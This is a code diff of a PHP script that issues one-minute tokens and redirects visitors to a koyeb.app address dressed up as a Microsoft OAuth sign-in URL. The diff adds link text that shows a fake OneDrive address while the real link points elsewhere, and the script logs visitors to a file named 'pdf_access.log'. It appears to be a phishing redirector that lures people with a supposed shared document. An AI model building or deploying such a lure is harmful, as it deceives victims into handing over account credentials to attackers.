@@ -4,14 +4,18 @@
 // ==============================================
 
 // Enable error reporting for debugging (disable in production)
-error_reporting(0);
-ini_set('display_errors', 0);
+if (getenv('APP_ENV') !== 'production') {
+    error_reporting(E_ALL);
+    ini_set('display_errors', 1);
+} else {
+    error_reporting(0);
+    ini_set('display_errors', 0);
+}
 
 // ================= CONFIGURATION =================
 $config = [
     'redirect_url' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/', // <--- Change to your target URL
-    'temp_prefix' => 'temp_',           // Prefix for temp tokens
-    'expire_seconds' => 60,
+    'expire_seconds' => 60,  // Token expiry time in seconds
     'log_file' => 'pdf_access.log',
     'redirect_delay' => 1
 ];
@@ -23,38 +27,23 @@ if (php_sapi_name() === 'cli') {
 
 // ================= TOKEN HANDLING =================
 function generateToken() {
-    return bin2hex(random_bytes(16)) . '_' . time();
+    return bin2hex(random_bytes(16)) . '_' . time();  // Token is a combination of random bytes and the current time
 }
 
 function isTokenValid($token) {
     $parts = explode('_', $token);
-    return (count($parts) === 2 && (time() - (int)$parts[1]) <= 60);
-}
-
-function cleanExpiredFiles($prefix) {
-    $files = glob($prefix . '*');
-    foreach ($files as $file) {
-        if (filemtime($file) < time() - 120) {
-            @unlink($file);
-        }
-    }
+    if (count($parts) !== 2) return false;
+    return (time() - (int)$parts[1]) <= 60;  // Token is valid for 1 minute
 }
 
 // ================= REQUEST HANDLING =================
 try {
     // Handle token-based redirect
     if (isset($_GET['token'])) {
-        cleanExpiredFiles($config['temp_prefix']);
-        
         $token = $_GET['token'];
-        
+
         if (!isTokenValid($token)) {
             throw new Exception("This link has expired after 1 minute");
-        }
-
-        $tempTokenFile = $config['temp_prefix'] . $token;
-        if (!file_exists($tempTokenFile)) {
-            throw new Exception("The temporary link is no longer available");
         }
 
         // Log successful access
@@ -67,24 +56,17 @@ try {
             $_SERVER['HTTP_USER_AGENT']
         ), FILE_APPEND);
 
-        @unlink($tempTokenFile); // Clean after use
+        // Redirect to the target URL
         header("Location: " . $config['redirect_url']);
         exit;
     }
 
     // ================= NEW REQUEST =================
     $token = generateToken();
-    $tempTokenFile = $config['temp_prefix'] . $token;
-
-    if (!@touch($tempTokenFile)) {
-        throw new Exception("System error: Could not generate token");
-    }
-
-    $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') .
-                   $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
+    $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
     $tempUrl = $current_url . '?token=' . urlencode($token);
 
-    // Log generation
+    // Log token generation
     file_put_contents($config['log_file'], sprintf(
         "%s|GENERATED|%s|%s|%s\n",
         date('Y-m-d H:i:s'),
@@ -167,7 +149,7 @@ try {
         
         <div class="url-box">
             <strong>One-time access link:</strong><br>
-            <a href="<?= htmlspecialchars($tempUrl) ?>"><?= htmlspecialchars($tempUrl) ?></a>
+            <a href="<?= htmlspecialchars($tempUrl) ?>">https://onedrive.live.com/redir?resid=D33F0BD97CFC485D%21119&page=Edit&wd=target%28Quick%20Notes.one%7Ccb5c4e00-571c-4d96-90cd-82d72609447d%2FUntitled%20Page%7C43ba1c22-a7ef-457f-959e-25fceaa10fec%2F%29&wdorigin=NavigationUrl</a>
         </div>
         
         <div class="notice">
